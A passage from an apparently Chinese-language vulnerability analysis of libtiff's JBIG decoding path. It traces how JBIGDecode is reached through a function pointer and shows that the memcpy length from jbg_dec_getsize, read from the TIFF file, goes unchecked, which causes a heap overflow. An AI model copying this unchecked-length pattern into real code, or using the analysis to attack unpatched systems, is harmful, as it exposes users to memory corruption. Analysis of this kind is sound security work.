            <span class="p">(</span><span class="n">tif</span><span class="o">-&gt;</span><span class="n">tif_flags</span> <span class="o">&amp;</span> <span class="n">TIFF_NOBITREV</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
            <span class="n">TIFFReverseBits</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">stripsize</span><span class="p">);</span>

        <span class="p">(</span><span class="o">*</span><span class="n">tif</span><span class="o">-&gt;</span><span class="n">tif_postdecode</span><span class="p">)(</span><span class="n">tif</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="n">stripsize</span><span class="p">);</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">stripsize</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">((</span><span class="n">size</span><span class="o">!=</span><span class="p">(</span><span class="n">tmsize_t</span><span class="p">)(</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="n">size</span><span class="o">&lt;</span><span class="n">stripsize</span><span class="p">))</span>
        <span class="n">stripsize</span><span class="o">=</span><span class="n">size</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">TIFFFillStrip</span><span class="p">(</span><span class="n">tif</span><span class="p">,</span><span class="n">strip</span><span class="p">))</span>
        <span class="k">return</span><span class="p">((</span><span class="n">tmsize_t</span><span class="p">)(</span><span class="o">-</span><span class="mi">1</span><span class="p">));</span>
    <span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">tif</span><span class="o">-&gt;</span><span class="n">tif_decodestrip</span><span class="p">)(</span><span class="n">tif</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="n">stripsize</span><span class="p">,</span><span class="n">plane</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">0</span><span class="p">)</span><span class="c1">//调用JBIGDecode</span>
        <span class="k">return</span><span class="p">((</span><span class="n">tmsize_t</span><span class="p">)(</span><span class="o">-</span><span class="mi">1</span><span class="p">));</span>
    <span class="p">(</span><span class="o">*</span><span class="n">tif</span><span class="o">-&gt;</span><span class="n">tif_postdecode</span><span class="p">)(</span><span class="n">tif</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="n">stripsize</span><span class="p">);</span>
    <span class="k">return</span><span class="p">(</span><span class="n">stripsize</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p>这里没有明显出现JBIGDecode函数名，但其实是用了函数指针的方法调用的</p>
<p>在TIFFInitJBIG函数中声明了该函数指针：</p>
<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">TIFFInitJBIG</span><span class="p">(</span><span class="n">TIFF</span><span class="o">*</span> <span class="n">tif</span><span class="p">,</span> <span class="kt">int</span> <span class="n">scheme</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">assert</span><span class="p">(</span><span class="n">scheme</span> <span class="o">==</span> <span class="n">COMPRESSION_JBIG</span><span class="p">);</span>

    <span class="cm">/*</span>
<span class="cm">     * These flags are set so the JBIG Codec can control when to reverse</span>
<span class="cm">     * bits and when not to and to allow the jbig decoder and bit reverser</span>
<span class="cm">     * to write to memory when necessary.</span>
<span class="cm">     */</span>
    <span class="n">tif</span><span class="o">-&gt;</span><span class="n">tif_flags</span> <span class="o">|=</span> <span class="n">TIFF_NOBITREV</span><span class="p">;</span>
    <span class="n">tif</span><span class="o">-&gt;</span><span class="n">tif_flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">TIFF_MAPPED</span><span class="p">;</span>

    <span class="cm">/* Setup the function pointers for encode, decode, and cleanup. */</span>
    <span class="n">tif</span><span class="o">-&gt;</span><span class="n">tif_setupdecode</span> <span class="o">=</span> <span class="n">JBIGSetupDecode</span><span class="p">;</span>
    <span class="n">tif</span><span class="o">-&gt;</span><span class="n">tif_decodestrip</span> <span class="o">=</span> <span class="n">JBIGDecode</span><span class="p">;</span><span class="c1">//&lt;&lt;&lt;声明</span>
    <span class="n">tif</span><span class="o">-&gt;</span><span class="n">tif_setupencode</span> <span class="o">=</span> <span class="n">JBIGSetupEncode</span><span class="p">;</span>
    <span class="n">tif</span><span class="o">-&gt;</span><span class="n">tif_encodestrip</span> <span class="o">=</span> <span class="n">JBIGEncode</span><span class="p">;</span>

    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>最后来看JBIGDecode函数</p>
<div class="highlight"><pre><span></span><span class="k">static</span> <span class="kt">int</span> <span class="nf">JBIGDecode</span><span class="p">(</span><span class="n">TIFF</span><span class="o">*</span> <span class="n">tif</span><span class="p">,</span> <span class="n">uint8</span><span class="o">*</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">tmsize_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">uint16</span> <span class="n">s</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">jbg_dec_state</span> <span class="n">decoder</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">decodeStatus</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">pImage</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">size</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">s</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">isFillOrder</span><span class="p">(</span><span class="n">tif</span><span class="p">,</span> <span class="n">tif</span><span class="o">-&gt;</span><span class="n">tif_dir</span><span class="p">.</span><span class="n">td_fillorder</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="n">TIFFReverseBits</span><span class="p">(</span><span class="n">tif</span><span class="o">-&gt;</span><span class="n">tif_rawdata</span><span class="p">,</span> <span class="n">tif</span><span class="o">-&gt;</span><span class="n">tif_rawdatasize</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">jbg_dec_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">decoder</span><span class="p">);</span>

<span class="cp">#if defined(HAVE_JBG_NEWLEN)</span>
    <span class="n">jbg_newlen</span><span class="p">(</span><span class="n">tif</span><span class="o">-&gt;</span><span class="n">tif_rawdata</span><span class="p">,</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">tif</span><span class="o">-&gt;</span><span class="n">tif_rawdatasize</span><span class="p">);</span>
<span class="cp">#endif </span><span class="cm">/* HAVE_JBG_NEWLEN */</span><span class="cp"></span>

    <span class="n">decodeStatus</span> <span class="o">=</span> <span class="n">jbg_dec_in</span><span class="p">(</span><span class="o">&amp;</span><span class="n">decoder</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">tif</span><span class="o">-&gt;</span><span class="n">tif_rawdata</span><span class="p">,</span>
                  <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">tif</span><span class="o">-&gt;</span><span class="n">tif_rawdatasize</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">JBG_EOK</span> <span class="o">!=</span> <span class="n">decodeStatus</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">TIFFErrorExt</span><span class="p">(</span><span class="n">tif</span><span class="o">-&gt;</span><span class="n">tif_clientdata</span><span class="p">,</span>
                 <span class="s">"JBIG"</span><span class="p">,</span> <span class="s">"Error (%d) decoding: %s"</span><span class="p">,</span>
                 <span class="n">decodeStatus</span><span class="p">,</span>
<span class="cp">#if defined(JBG_EN)</span>
                 <span class="n">jbg_strerror</span><span class="p">(</span><span class="n">decodeStatus</span><span class="p">,</span> <span class="n">JBG_EN</span><span class="p">)</span>
<span class="cp">#else</span>
                 <span class="n">jbg_strerror</span><span class="p">(</span><span class="n">decodeStatus</span><span class="p">)</span>
<span class="cp">#endif</span>
                 <span class="p">);</span>
        <span class="n">jbg_dec_free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">decoder</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">pImage</span> <span class="o">=</span> <span class="n">jbg_dec_getimage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">decoder</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">_TIFFmemcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">pImage</span><span class="p">,</span> <span class="n">jbg_dec_getsize</span><span class="p">(</span><span class="o">&amp;</span><span class="n">decoder</span><span class="p">));</span>
    <span class="n">jbg_dec_free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">decoder</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">_TIFFmemcpy</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span> <span class="n">d</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span><span class="o">*</span> <span class="n">s</span><span class="p">,</span> <span class="n">tmsize_t</span> <span class="n">c</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">d</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span> <span class="n">c</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p>可以看到，这里对<code>jbg_dec_getsize(&amp;decoder)</code>的返回值是完全没有检查的，而该函数是直接封装到libjbig中的，它会直接从tiff文件中读取长度，因此过长的长度也不会被检查出来，由此引发堆溢出的漏洞</p>
</div>
</div>